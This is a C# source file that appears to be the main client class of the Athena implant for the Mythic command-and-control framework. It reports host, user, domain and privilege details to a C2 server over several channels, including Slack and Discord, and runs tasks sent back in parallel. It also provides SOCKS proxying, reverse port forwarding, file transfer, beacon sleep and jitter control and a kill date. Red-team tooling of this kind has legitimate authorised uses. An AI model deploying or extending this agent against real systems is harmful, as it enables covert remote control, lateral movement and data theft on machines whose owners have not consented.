using Athena.Commands;
using Athena.Handler.Common;
using Athena.Handler.Proxy;
using Athena.Models.Proxy;
using Athena.Models.Responses;
using Athena.Models.Comms.SMB;
using Athena.Models.Commands;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using Athena.Models.Config;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;


namespace Athena
{
    public class AthenaClient
    {
        public IProfile profile { get; set; }
        public CommandHandler commandHandler { get; set; }
        public SocksHandler socksHandler { get; set; }
        public RPortFwdHandler rportfwdHandler { get; set; }
        public ForwarderHandler forwarderHandler { get; set; }
        public bool exit { get; set; }
        List<IProfile> availableProfiles { get; set; }
        public AthenaClient()
        {
            this.exit = false;
            this.availableProfiles = GetProfiles();
            this.profile = SelectProfile(0);
            this.socksHandler = new SocksHandler();
            this.rportfwdHandler = new RPortFwdHandler();
            this.commandHandler = new CommandHandler();
            this.forwarderHandler = new ForwarderHandler();
            this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
            this.commandHandler.StartForwarder += StartForwarder;
            this.commandHandler.StopForwarder += StopForwarder;
            this.commandHandler.ExitRequested += ExitRequested;
            this.commandHandler.SetProfile += SetProfile;
            this.commandHandler.ListForwarders += ListForwarders;
            this.commandHandler.ListProfiles += ListProfiles;
            this.commandHandler.StartRportFwd += StartRportFwd;
            this.commandHandler.StopRportFwd += StopRportFwd;
        }

        private void StopRportFwd(object sender, TaskEventArgs e)
        {
            var dict = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            if (this.rportfwdHandler.StopListener(int.Parse(dict["lport"])).Result)
            {
                TaskResponseHandler.AddResponse(new ResponseResult()
                {
                    task_id = e.job.task.id,
                    completed = true,
                    process_response = new Dictionary<string, string>()
                    {
                        { "message", "0x39" }
                    }

                });
                return;
            }

            TaskResponseHandler.AddResponse(new ResponseResult()
            {
                task_id = e.job.task.id,
                completed = true,
                process_response = new Dictionary<string, string>()
                    {
                        { "message", "0x40" }
                    },
                status = "error"

            });
        }

        private void StartRportFwd(object sender, TaskEventArgs e)
        {
            if (this.rportfwdHandler.StartListener(e.job).Result)
            {
                TaskResponseHandler.AddResponse(new ResponseResult()
                {
                    task_id = e.job.task.id,
                    completed = true,
                    process_response = new Dictionary<string, string>()
                    {
                        { "message", "0x41" }
                    }

                });
                return;
            }
            TaskResponseHandler.AddResponse(new ResponseResult()
            {
                task_id = e.job.task.id,
                completed = true,
                process_response = new Dictionary<string, string>()
                    {
                        { "message", "0x42" }
                    },
                status = "error"

            });

        }

        /// <summary>
        /// Select the initial C2 Profile Configuration
        /// </summary>
        /// <param name="choice">The config to switch to, if null a random one will be selected</param>
        private IProfile SelectProfile(int choice)
        {
            return this.availableProfiles[choice];
        }

        /// <summary>
        /// Get available C2 Profile Configurations
        /// </summary>
        public List<IProfile> GetProfiles()
        {
            List<string> profiles = new List<string>();
            List<IProfile> configs = new List<IProfile>();
#if WEBSOCKET
            profiles.Add("Athena.Profiles.Websocket");
#endif
#if HTTP
            profiles.Add("Athena.Profiles.HTTP");
#endif
#if SLACK
            profiles.Add("Athena.Profiles.Slack");
#endif
#if DISCORD
            profiles.Add("Athena.Profiles.Discord");
#endif
#if SMBPROFILE
            profiles.Add("Athena.Profiles.SMB");
#endif

#if NATIVEAOT
            configs.Add(profiles.FirstOrDefault().ToUpper(), new Config());
#else

#if DEBUG
            profiles.Add("Athena.Profiles.Debug");
#endif
            foreach (var profile in profiles)
            {
                try
                {
                    Assembly profileAsm = Assembly.Load($"{profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");

                    if (profileAsm == null)
                    {
                        continue;
                    }
                    foreach (Type t in profileAsm.GetTypes())
                    {
                        if (typeof(IProfile).IsAssignableFrom(t))
                        {
                            Debug.WriteLine($"[{DateTime.Now}] Adding profile: {profile}");
                            IProfile config = (IProfile)Activator.CreateInstance(t);
                            
                            //Make sure we haven't hit one of the expiration dates
                            Misc.CheckExpiration(config.killDate);

                            //Subscribe to TaskingReceived events
                            Debug.WriteLine($"[{DateTime.Now}] Subscribing to OnTaskingReceived");
                            config.SetMessageReceived += OnMessageReceived;

                            //Add profile to our tracker
                            configs.Add(config);
                        }
                    }
                }
                catch
                {
                    Debug.WriteLine($"[{DateTime.Now}] Failed to load assembly for {profile}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
                }
            }
#endif
            return configs;
        }

        #region Communication Functions      
        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<bool> CheckIn()
        {

            //Maybe update this flow to be more agnostic
            //e.g. have a generic "HandleMessage" function that checks if the action is a checkin response or tasking, and calls the appropriate function, to make the profile development easier
            Checkin ct = new Checkin()
            {
                action = "checkin",
                ips = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Select(a => a.ToString()).ToArray(),
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id,
                uuid = this.profile.uuid,
                architecture = await Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = TokenHandler.getIntegrity(),
            };

            try
            {
                return await this.profile.Checkin(ct);
            }
            catch (Exception e)
            {
                return false;
            }
        }

        /// <summary>
        /// EventHandler for when a message is sent to the agent
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="args">TaskEventArgs containing the string representation of the object</param>
        private async void OnMessageReceived(object sender, MessageReceivedArgs args)
        {
            try
            {
                var dic = JsonSerializer.Deserialize<Dictionary<string, object>>(args.message);
                string action = dic["action"].ToString();

                if(action == "checkin")
                {
                    OnCheckinReceived(JsonSerializer.Deserialize(args.message, CheckinResponseJsonContext.Default.CheckinResponse));
                }
                else
                {
                    //This function handles both the get_tasking and post_response actions. The only difference between the responses of the two is whether it contains tasks or not.
                    OnTaskingReceived(JsonSerializer.Deserialize(args.message, GetTaskingResponseJsonContext.Default.GetTaskingResponse));
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.ToString());
            }
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="cr">CheckIn Response</param>
        private async void OnCheckinReceived(CheckinResponse cr)
        {

            if (cr.status == "failed")
            {
                Environment.Exit(0);
            }

            try
            {
                foreach (IProfile config in availableProfiles)
                {
                    config.uuid = cr.id;
                    if (config.encrypted)
                    {
                        config.crypt = new PSKCrypto(cr.id, this.profile.psk);
                    }
                }
            }
            catch
            {
                Debug.WriteLine($"[{DateTime.Now}] Failed to update agent info, exiting.");
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Parse the GetTaskingResponse and forward them to the required places
        /// </summary>
        /// <param name="responseString">Response from the Mythic server</param>
        private async void OnTaskingReceived(GetTaskingResponse gtr)
        {
            //Pass up socks messages
            if (gtr.socks is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.socks.Count} socks messages.");
                    HandleSocks(gtr.socks);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());

                }
            }
            
            if (gtr.rpfwd is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.rpfwd.Count} socks messages.");
                    HandleRpFwd(gtr.rpfwd);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());

                }
            }

            if (gtr.delegates is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.delegates.Count} delegates.");
                    HandleDelegates(gtr.delegates);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }
            }

            if (gtr.responses is not null)
            {
                try
                {
                    Debug.WriteLine($"[{DateTime.Now}] Handling {gtr.responses.Count} Mythic responses. (Upload/Download)");
                    HandleMythicResponses(gtr.responses);
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e.ToString());
                }
            }

            if(gtr.tasks is not null)
            {
                Parallel.ForEach(gtr.tasks, async c =>
                {
                    Debug.WriteLine($"[{DateTime.Now}] Executing task with ID: {c.id}");
                    //Does this need to be a Task.Run()?
                    Task.Run(() => this.commandHandler.StartJob(c));
                });
            }
        }

        #endregion
        #region Helper Functions
        /// <summary>
        /// EventHandler to update the sleep and jitter
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void SetSleepAndJitter(object sender, TaskEventArgs e)
        {
            ResponseResult result = new ResponseResult()
            {
                completed = true,
                task_id = e.job.task.id
            };
            Dictionary<string, string> sleepInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            try
            {
                this.profile.sleep = int.Parse(sleepInfo["sleep"]);
                this.profile.jitter = int.Parse(sleepInfo["jitter"]);
                result.process_response = new Dictionary<string, string>
                {
                    { "message", "0x0A" }
                };
            }
            catch
            {
                result.process_response = new Dictionary<string, string>
                {
                    { "message", "0x11" }
                };
                result.status = "error";
            }
            TaskResponseHandler.AddResponse(result.ToJson());

        }
        
        /// <summary>
        /// EventHandler to set the current profile
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">ProfileEventArgs containing the MythicJob object</param>
        private void SetProfile(object sender, ProfileEventArgs e)
        {
            var profileInfo = Misc.ConvertJsonStringToDict(e.job.task.parameters);
            int choice;
            var response = new ResponseResult
            {
                completed = true,
                task_id = e.job.task.id,

            };
            Debug.WriteLine($"[{DateTime.Now}] Stopping profile: {this.profile.GetType()}");
            Debug.WriteLine($"[{DateTime.Now}] Profile Info: {profileInfo}");

            foreach(var p in profileInfo)
            {
                Debug.WriteLine($"[{DateTime.Now}] {p.Key} - {p.Value}");
            }

            if (int.TryParse(profileInfo["id"], out choice) && (this.availableProfiles.Count > choice))
            {
                Debug.WriteLine($"[{DateTime.Now}] Stopping profile: {this.profile.GetType()}");
                this.profile.StopBeacon();
                Debug.WriteLine($"[{DateTime.Now}] Switching profile: {choice}");
                this.profile = SelectProfile(choice);
                Debug.WriteLine($"[{DateTime.Now}] Starting profile: {this.profile.GetType()}");
                this.profile.StartBeacon();
                response.process_response = new Dictionary<string, string>
                {
                    { "message", "0x02" }
                };
            }
            else
            {
                Debug.WriteLine($"[{DateTime.Now}] Invalid profile option specified.");
                Debug.WriteLine($"[{DateTime.Now}] {this.availableProfiles.Count}");
                response.process_response = new Dictionary<string, string>
                {
                    { "message", "0x01" }
                };
                response.status = "error";
            }
            TaskResponseHandler.AddResponse(response);
            return;
        }

        /// <summary>
        /// EventHandler to start the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private async void StartForwarder(object sender, TaskEventArgs e)
        {
            //var res = this.forwarder.Link(e.job, this.profile.uuid).Result;
            var res = await this.forwarderHandler.LinkForwarder(e.job, e.job.task.id, this.profile.uuid);
            TaskResponseHandler.AddResponse(res.ToJson());
        }

        /// <summary>
        /// EventHandler to stop the forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void StopForwarder(object sender, TaskEventArgs e)
        {
            bool success = forwarderHandler.UnlinkForwarder(e.job).Result;
            //this.forwarder.Unlink();
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                process_response = success ? new Dictionary<string, string>{{ "message", "0x03" }} : new Dictionary<string, string> { { "message", "0x04"} },
                task_id = e.job.task.id,
                completed = true,
                status = success ? String.Empty : "error"
            }.ToJson());
        }
        
        /// <summary>
        /// EventHandler to list available forwarders
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void ListForwarders(object sender, TaskEventArgs e)
        {
            //this.forwarder.Unlink();
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                user_output = forwarderHandler.ListForwarders().Result,
                task_id = e.job.task.id,
                completed = true,
            }.ToJson());
        }

        /// <summary>
        /// EventHandler to list available profiles
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void ListProfiles(object sender, TaskEventArgs e)
        {
            StringBuilder sb = new StringBuilder();
            int i = 0;
            foreach(var prof in this.availableProfiles)
            {
                sb.AppendLine($"{i} - {this.availableProfiles[i].GetType()}");
            }

            TaskResponseHandler.AddResponse(new ResponseResult
            {
                user_output = sb.ToString(),
                task_id = e.job.task.id,
                completed = true,
            }.ToJson());
        }

        /// <summary>
        /// EventHandler to stop socks forwarder
        /// </summary>
        /// <param name="sender">Event Sender</param>
        /// <param name="e">TaskEventArgs containing the MythicJob object</param>
        private void ExitRequested(object sender, TaskEventArgs e)
        {
            TaskResponseHandler.AddResponse(new ResponseResult
            {
                process_response = new Dictionary<string, string> { { "message", "0x09" } },
                completed = true,
                task_id = e.job.task.id,
            }.ToJson());

            this.exit = true;
            this.profile.StopBeacon();
        }

        /// <summary>
        /// Handles SOCKS messages received from the Mythic server
        /// </summary>
        /// <param name="socks">List of SocksMessages</param>
        private async Task HandleSocks(List<MythicDatagram> socks)
        {
            foreach(var sm in socks)
            {
                await this.socksHandler.HandleMessage(sm);
            }

            this.socksHandler.GetSocksMessages();
        }
        
        /// <summary>
        /// Handles rportfwd messages received from the Mythic server
        /// </summary>
        /// <param name="rportfwd">List of SocksMessages</param>
        private async Task HandleRpFwd(List<MythicDatagram> rportfwd)
        {
            foreach (var sm in rportfwd)
            {

                await this.rportfwdHandler.HandleMessage(sm);
            }

            this.rportfwdHandler.GetRportFwdMessages();
        }

        /// <summary>
        /// Handle delegate messages received from the Mythic server
        /// </summary>
        /// <param name="delegates">List of DelegateMessages</param>
        private async Task HandleDelegates(List<DelegateMessage> delegates)
        {
            Debug.WriteLine($"[{DateTime.Now}] Passing to forwarder Handler.");
            await this.forwarderHandler.HandleDelegateMessages(delegates);
        }

        /// <summary>
        /// Handle response result messages received from the Mythic server
        /// </summary>
        /// <param name="responses">List of MythicResponseResults</param>
        private async Task HandleMythicResponses(List<MythicResponseResult> responses)
        {
            Parallel.ForEach(responses, async response =>
            {
                if (await this.commandHandler.HasUploadJob(response.task_id))
                {
                    await this.commandHandler.HandleUploadPiece(response);
                }

                if (await this.commandHandler.HasDownloadJob(response.task_id))
                {
                    await this.commandHandler.HandleDownloadPiece(response);
                }
            });
        }
        #endregion
    }
}
